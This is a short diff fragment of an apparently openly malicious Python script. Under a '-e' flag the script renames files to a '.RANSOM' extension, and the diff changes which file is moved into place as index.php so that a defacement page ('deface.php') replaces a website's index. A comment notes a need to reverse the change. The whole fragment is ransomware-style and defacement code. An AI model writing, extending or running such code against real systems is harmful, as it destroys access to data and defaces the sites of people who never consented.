@@ -21,8 +21,9 @@ if sys.argv[1] == "-e":
     base = os.path.splitext(current_file)[0]
     os.rename(current_file, base + '.RANSOM')
     
+    # Need a way to change this back
     if base == "index":
-        os.rename('hax0rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr.gif', 'index.php')
+        os.rename('deface.php', 'index.php')
 
 elif sys.argv[1] == "-d":
     
